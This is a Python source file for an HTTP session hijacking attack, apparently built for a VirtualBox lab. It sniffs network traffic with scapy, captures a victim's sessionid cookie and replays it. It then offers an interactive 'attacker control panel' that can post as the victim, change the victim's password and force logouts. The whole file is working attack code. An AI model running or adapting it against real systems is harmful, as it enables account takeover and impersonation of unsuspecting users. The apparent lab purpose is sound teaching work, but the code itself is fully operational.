"""
src/attacks/HTTP_session_hijacking.py

Headless-safe HTTP Session Hijacking attack.
GUI is OPTIONAL and enabled only if DISPLAY is available.
DISPLAY is available in VirtualBox GUI mode enabled -> Linux interface

Text-based attacker control panel after SUCCESS.
"""

import threading
import re
import os
import requests
from scapy.all import sniff, TCP, Raw
from datetime import datetime

# GUI imports are OPTIONAL
GUI_AVAILABLE = False
if os.environ.get("DISPLAY"):
    try:
        from tkinter import Tk, ttk, StringVar, Label
        GUI_AVAILABLE = True
    except Exception:
        GUI_AVAILABLE = False


class HTTPSessionHijacker(threading.Thread):
    def __init__(self, target_domain, target_ip, victim_ip, interface=None):
        super().__init__()
        self.daemon = True

        self._stop_event = threading.Event()
        self._lock = threading.Lock()

        self.target_domain = target_domain
        self.target_ip = target_ip
        self.victim_ip = victim_ip
        self.interface = interface

        self.stolen_cookie = None
        self.session_replay_success = False

        self._session = None

        # Control panel state
        self._control_panel_started = False

        # prevent spam on same cookie
        self._last_seen_cookie = None

        self.gui = None
        if GUI_AVAILABLE:
            self._setup_gui()
        else:
            print("[INFO] Running in headless mode (no GUI).")

    # ---------------- GUI (optional) ----------------

    def _setup_gui(self):
        self.gui = Tk()
        self.gui.title("HTTP Session Hijacking")
        self.gui.geometry("520x320")
        self.gui.resizable(False, False)

        self.status_var = StringVar(value="Initializing attack...")

        Label(self.gui, text="HTTP Session Hijacking", font=("Arial", 16, "bold")).pack(pady=10)
        Label(self.gui, textvariable=self.status_var).pack(pady=8)

        self.progress = ttk.Progressbar(self.gui, length=420, maximum=100)
        self.progress.pack(pady=12)

        self.log_box = ttk.Label(self.gui, text="", wraplength=480, justify="left")
        self.log_box.pack(pady=8)

        threading.Thread(target=self.gui.mainloop, daemon=True).start()

    def _update_status(self, message, progress=None):
        now = datetime.now().strftime("%H:%M:%S")
        print(f"[HIJACK] [{now}] {message}")

        if self.gui:
            self.status_var.set(message)
            self.log_box.config(text=self.log_box.cget("text") + f"\n• {message}")
            if progress is not None:
                self.progress["value"] = progress

    # ---------------- Session helpers ----------------

    def _ensure_session(self) -> requests.Session:
        """
        Create attacker session (requests.Session) once, but allow hot-swapping cookie.
        """
        if self._session is None:
            s = requests.Session()
            s.headers.update(
                {
                    "Host": self.target_domain,
                    "User-Agent": "AttackClient/1.0",
                    "Accept": "text/html,application/xhtml+xml",
                    "Connection": "close",
                }
            )
            self._session = s

        # Always ensure cookie is up-to-date
        if self.stolen_cookie:
            self._session.cookies.set("sessionid", self.stolen_cookie, path="/")

        return self._session

    def _set_stolen_cookie(self, new_cookie: str, reason: str):
        """
        Update stolen_cookie + cached requests session cookie jar.
        """
        with self._lock:
            self.stolen_cookie = new_cookie
            if self._session is not None:
                self._session.cookies.set("sessionid", self.stolen_cookie, path="/")

        self._update_status(f"[!] Control Panel cookie updated ({reason}): sessionid={new_cookie}")

    def _clear_attacker_session(self, reason: str):
        """
        After logout/invalidate, attacker cookie becomes invalid. Clear locally so we don't lie to ourselves.
        """
        with self._lock:
            if self._session is not None:
                self._session.cookies.clear()
            # keep stolen_cookie value visible for logs, but session jar is cleared

        self._update_status(f"[!] Attacker session cleared ({reason}). Awaiting new victim session cookie...")

    # ---------------- HTTP helpers ----------------

    def _get(self, path: str, timeout=5) -> requests.Response:
        url = f"http://{self.target_ip}{path}"
        return self._ensure_session().get(url, timeout=timeout, allow_redirects=True)

    def _post(self, path: str, data: dict, timeout=5) -> requests.Response:
        """
        IMPORTANT: allow_redirects=False so we can still read Set-Cookie on 302 responses.
        """
        url = f"http://{self.target_ip}{path}"
        return self._ensure_session().post(url, data=data, timeout=timeout, allow_redirects=False)

    # ---------------- Attack logic ----------------

    def _packet_callback(self, packet):
        if self._stop_event.is_set():
            return

        if not (packet.haslayer(TCP) and packet.haslayer(Raw)):
            return

        payload = packet[Raw].load.decode(errors="ignore")

        # Only steal cookie when victim requests /profile
        if "GET /profile" in payload and "sessionid=" in payload:
            match = re.search(r"sessionid=([a-f0-9]+)", payload)
            if not match:
                return

            cookie = match.group(1)

            # Deduplicate identical cookie spam
            if cookie == self._last_seen_cookie:
                return
            self._last_seen_cookie = cookie

            self._update_status("Trigger hit: Victim requested /profile with session cookie", 35)
            self._update_status(f"Captured cookie: sessionid={cookie}", 40)
            self._update_status(f"Observed flow: {self.victim_ip} -> {self.target_ip}", 45)

            # If we already had a cookie, this means victim logged out/logged in again -> hot swap
            if self.stolen_cookie and cookie != self.stolen_cookie:
                self._set_stolen_cookie(cookie, reason="victim switched session/account")
                return  # don't re-run proof each time; control panel now acts as new victim

            # First time cookie capture
            self._set_stolen_cookie(cookie, reason="initial hijack")
            ok, _ = self._replay_and_prove()

            if ok and not self._control_panel_started:
                self._control_panel_started = True
                threading.Thread(target=self._attacker_control_panel, daemon=True).start()

    def _replay_and_prove(self):
        self._update_status("Replaying victim session (GET /profile) ...", 60)

        try:
            resp = self._get("/profile", timeout=5)

            if resp.status_code == 200:
                self.session_replay_success = True
                self._update_status("[PASS] Session hijack SUCCESS (HTTP 200)", 80)

                proof_html = self._save_proof_html(resp.text)
                report_txt = self._save_report_txt(resp, proof_html)

                self._update_status(f"Evidence: saved authenticated page snapshot -> {proof_html}", 90)
                self._update_status(f"Report: wrote attack summary -> {report_txt}", 95)

                self._print_impact_block()
                return True, proof_html

            self._update_status(
                f"[FAIL] Session hijack FAILED. status={resp.status_code}, snippet={resp.text[:120]!r}",
                100,
            )
            return False, None

        except Exception as e:
            self._update_status(f"Replay error: {e}", 100)
            return False, None

    def _save_proof_html(self, html: str) -> str:
        name = f"stolen_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(name, "w", encoding="utf-8") as f:
            f.write(html)
        return name

    def _save_report_txt(self, resp: requests.Response, proof_html_name: str) -> str:
        name = f"hijack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        lines = [
            "HTTP SESSION HIJACK REPORT",
            "==========================",
            f"Time: {datetime.now()}",
            f"Victim IP: {self.victim_ip}",
            f"Target Domain: {self.target_domain}",
            f"Target IP: {self.target_ip}",
            f"Interface: {self.interface}",
            "",
            "Captured Credential Material:",
            f"  sessionid={self.stolen_cookie}",
            "",
            "Replay Proof:",
            f"  GET /profile -> HTTP {resp.status_code}",
            f"  Proof HTML snapshot: {proof_html_name}",
            "",
            "Impact:",
            "  Attacker can perform any actions that rely solely on session cookie auth.",
            "  Server cannot distinguish attacker vs victim if cookie is only auth factor.",
        ]
        with open(name, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        return name

    def extract_profile_summary(self, html_text: str) -> str:
        """
        Safe summary: if we're on a 403 page, patterns won't match -> show clearer output.
        """
        def find(pattern):
            m = re.search(pattern, html_text, re.DOTALL | re.IGNORECASE)
            return m.group(1).strip() if m else None

        username = find(r"<h2>@([^<]+)</h2>")
        operation = find(r"Operation Nightwatch:\s*<b>([^<]+)</b>")
        level = find(r"Level\s*(\d+)\s*Access Granted")

        if not username:
            # likely 403 /login / session-ended page
            return (
                "USER            : (unknown / not on profile)\n"
                "AUTH STATUS     : INVALID SESSION OR NOT ON /profile\n"
                "HINT            : Victim may have logged out / session invalidated.\n"
            )

        return (
            f"USER            : @{username}\n"
            f"OPERATION       : Nightwatch ({operation or 'N/A'})\n"
            f"SECURITY LEVEL  : {level or 'N/A'}\n"
            f"AUTH STATUS     : VALID SESSION\n"
        )

    def _print_impact_block(self):
        self._update_status("-" * 72)
        self._update_status("What SUCCESS means (session hijacking impact):")
        self._update_status(" - Attacker can access any page that trusts this session cookie.")
        self._update_status(" - Server cannot distinguish attacker vs victim if cookie is only auth.")
        self._update_status(" - Access persists until logout / expiry / server invalidation.")
        self._update_status("Next: Attacker Control Panel lets you act as victim manually.")
        self._update_status("-" * 72)

    # ---------------- Attacker Control Panel (TEXT-BASED) ----------------

    def _attacker_control_panel(self):
        self._update_status("Attacker Control Panel ready (text-based).", 100)
        self._update_status("Victim browser is NOT touched. These actions are attacker-only.")
        self._update_status("Sniffer continues running: if victim logs in again, cookie will auto-update.")

        while True:
            try:
                print("\n" + "=" * 80)
                print("ATTACKER CONTROL PANEL (acting as victim via stolen session cookie)")
                print("=" * 80)
                print(f"Target: http://{self.target_ip}   Host: {self.target_domain}")
                print(f"Victim cookie: sessionid={self.stolen_cookie}")
                print("-" * 80)
                print("1) View victim /profile (as victim)")
                print("2) Post as victim (/post)")
                print("3) Change victim password (/change-password)  [manual]")
                print("4) Invalidate ALL victim sessions (force logout)  [manual]")
                print("5) Logout THIS stolen session (/logout)")
                print("6) Quit control panel")
                choice = input("\nSelect option [1-6]: ").strip()

                if choice == "1":
                    resp = self._get("/profile", timeout=5)
                    print(f"\n[CP] HTTP {resp.status_code}")
                    print(self.extract_profile_summary(resp.text))

                elif choice == "2":
                    msg = input("\nEnter message to post as victim: ").strip()
                    if not msg:
                        print("[CP] Empty message. Cancelled.")
                        continue
                    resp = self._post("/post", data={"message": msg}, timeout=5)
                    print(f"\n[CP] HTTP {resp.status_code} (302 is OK)")
                    if resp.status_code == 302:
                        print("[CP] ✔ Post submitted. Victim will see it on next refresh of /profile.")
                    else:
                        print(f"[CP] Response snippet: {resp.text[:160]!r}")

                elif choice == "3":
                    new_pw = input("\nEnter NEW password: ").strip()
                    confirm = input("Confirm password: ").strip()
                    if not new_pw or confirm != new_pw:
                        print("[CP] Password mismatch/empty. Cancelled.")
                        continue

                    resp = self._post("/change-password", data={"new_password": new_pw}, timeout=5)

                    # Server sets new sessionid on 302. Capture it and update our session jar.
                    set_cookie = resp.headers.get("Set-Cookie", "")
                    m = re.search(r"sessionid=([a-f0-9]+)", set_cookie)
                    if m:
                        self._set_stolen_cookie(m.group(1), reason="server issued new session after password change")
                        print("[CP] [!] Attacker session refreshed (new cookie acquired)")

                    print(f"\n[CP] HTTP {resp.status_code} (302 is OK)")
                    if resp.status_code != 302:
                        print(f"[CP] Response snippet: {resp.text[:160]!r}")

                elif choice == "4":
                    confirm = input("\nType 'YES' to invalidate all sessions: ").strip()
                    if confirm != "YES":
                        print("[CP] Cancelled.")
                        continue

                    resp = self._post("/invalidate-sessions", data={"confirm": "YES"}, timeout=5)
                    print(f"\n[CP] HTTP {resp.status_code} (302 is OK)")

                    # This action kills sessions -> attacker cookie becomes invalid too.
                    self._clear_attacker_session(reason="sessions invalidated on server")

                elif choice == "5":
                    resp = self._get("/logout", timeout=5)
                    print(f"\n[CP] HTTP {resp.status_code} (200/302 is OK)")
                    self._clear_attacker_session(reason="logout called")

                elif choice == "6":
                    self._update_status("Control panel exited by attacker.")
                    return

                else:
                    print("Invalid choice.")

            except (EOFError, KeyboardInterrupt):
                self._update_status("Control panel interrupted by attacker.")
                return
            except Exception as e:
                self._update_status(f"Control panel error: {e}")

    # ---------------- Thread ----------------

    def run(self):
        self._update_status("=" * 72)
        self._update_status("HTTP SESSION HIJACKING (DEMO) — Evidence-first, headless-safe")
        self._update_status(f" Interface      : {self.interface}")
        self._update_status(f" Victim IP       : {self.victim_ip}")
        self._update_status(f" Target Domain   : {self.target_domain}")
        self._update_status(f" Target IP (web) : {self.target_ip}")
        self._update_status(" Trigger         : Victim HTTP GET /profile containing sessionid cookie")
        self._update_status("=" * 72)
        self._update_status("Sniffing HTTP traffic...", 20)

        sniff(
            iface=self.interface,
            prn=self._packet_callback,
            store=0,
            stop_filter=lambda _: self._stop_event.is_set(),
        )

        self._update_status("Sniffer stopped.")

    def stop(self):
        self._stop_event.set()
        self._update_status("Attack stopped.", 100)
